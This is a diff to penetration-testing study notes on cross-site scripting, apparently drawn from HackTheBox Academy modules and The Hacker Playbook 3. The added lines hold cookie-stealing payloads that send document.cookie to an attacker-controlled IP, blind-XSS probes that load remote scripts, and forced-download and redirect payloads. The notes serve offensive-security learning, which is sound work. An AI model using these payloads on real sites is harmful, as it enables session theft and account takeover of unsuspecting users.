@@ -1,8 +1,6 @@
 # XSS and CSRF
 XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do.
 
-XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
-
 # Resources
 - [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
 - [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
@@ -50,9 +48,17 @@ Code review is the most reliable way to get a XSS rather than throwing automated
 | Change Website Title | `<script>document.title = 'HackTheBox Academy'</script>` |
 | Overwrite website's main body | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` |
 | Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
-| Load remote script | `<script src="http://OUR_IP/script.js"></script>` |
+| Load remote script to look for blind XSS | `<script src="http://OUR_IP/script.js"></script>` |
 | Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |
 
+# XSS Payloads
+| Description | Code |
+|-------------|------|
+| Cookie Stealing XSS | <script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script> |
+| Forcing the Download of a File | <script>var link = document.createElement('a'); link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script> |
+| Redirecting User | <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script> |
+
+Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 93). Secure Planet. Kindle Edition. 
 # Notes
 ## Stored XSS
 Most critical where the injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
@@ -73,8 +79,22 @@ Furthermore, some of the jQuery library functions that write to DOM objects are:
 - `add()`
 - `after()`
 - `append()`
-
+  
 If a Sink function writes the exact input without any sanitization (like the above functions), and no other means of sanitization were used, then we know that the page should be vulnerable to XSS.
+
+## Blind XSS
+Occurs when the vulnerability is triggered on a page we don't have access to like forms only accessible by priivleged users. Some potential examples include:
+- Contact Forms
+- Reviews
+- User Details
+- Support Tickets
+- HTTP User-Agent header
+
+The following will let us know which of the fields (`fullname` or `username`) is vulnerable based of what we see on our listener:
+```js
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+```
 
 
 
@@ -101,6 +121,7 @@ Determine where your input is getting printed in the HTTP response we receive ba
 - Often involves content that gets injected into the DOM after the page has already loaded
 
 # XSS Filter Bypasses
+- [OWASP FIlter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.
 
 How might these filters be implemented?
@@ -146,6 +167,12 @@ Execution Sinks:
 - constructor: `[].constructor.constructor(alert(1))()`
 
 ---
+
+# Tricks & Quirks
+- XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).
+- If you're defacing, you can always open the `.html` locally to test how it looks
+- Email fields usually must match an email format, even if we try manipulating the HTTP request parameters, as it's usually validated on both the front-end and the back-end. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.
+- Most common XSS protections are length issues and not allowing < or > or according to THP1.
 
 # HTB Module questions
 ## Cross-Site Scripting (XSS)
